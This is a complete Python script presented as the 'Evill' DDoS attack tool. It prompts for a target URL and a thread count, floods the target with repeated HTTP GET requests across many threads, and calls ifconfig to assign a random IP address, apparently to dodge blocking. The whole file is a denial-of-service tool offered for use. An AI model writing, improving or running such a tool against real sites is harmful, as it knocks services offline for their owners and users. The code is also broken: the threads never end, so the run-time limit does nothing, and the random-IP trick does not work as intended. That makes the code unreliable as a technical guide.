import os
import sys
import time
import threading
import requests
import random
import socket
import logging
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init()

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to perform the DDoS attack
def ddos_attack(target_url, thread_count, running_time):
    def attack_thread(target_url):
        while True:
            try:
                # Send HTTP GET request to the target URL
                response = requests.get(target_url)
                if response.status_code == 200:
                    logging.info(f"{Fore.GREEN}Successful attack on {target_url}")
                else:
                    logging.info(f"{Fore.RED}Failed attack on {target_url}")
            except requests.exceptions.RequestException as e:
                logging.info(f"{Fore.RED}Failed attack on {target_url}: {str(e)}")

    # Create threads for the attack
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=attack_thread, args=(target_url,))
        threads.append(thread)
        thread.start()

    # Wait for the specified running time
    time.sleep(running_time)

    # Terminate the threads
    for thread in threads:
        thread.join()

# Function to change the IP address
def change_ip():
    # Generate a random IP address
    new_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    # Set the new IP address
    os.system(f"ifconfig eth0 {new_ip}")

# Main function
def main():
    # Clear the screen
    os.system('cls' if os.name == 'nt' else 'clear')

    # Print the logo
    print(f"{Fore.RED}Evill{Style.RESET_ALL} - {Fore.YELLOW}DDoS Attack Tool{Style.RESET_ALL}")
    print(f"{Fore.RED}Creator: Evill Twin{Style.RESET_ALL}\n")

    # Get the target URL, thread count, and running time from the user
    target_url = input("Enter the target URL: ")
    thread_count = int(input("Enter the number of threads: "))
    running_time = int(input("Enter the running time in seconds (0 for unlimited): "))

    # Perform the DDoS attack
    start_time = time.time()
    while True:
        try:
            ddos_attack(target_url, thread_count, running_time)
            if running_time > 0:
                break
            else:
                change_ip()
        except KeyboardInterrupt:
            logging.info("DDoS attack interrupted by the user.")
            break
        except Exception as e:
            logging.error(f"An error occurred: {str(e)}")
            change_ip()

    end_time = time.time()
    logging.info(f"DDoS attack completed. Total time: {end_time - start_time:.2f} seconds.")

# Run the main function
if __name__ == '__main__':
    main()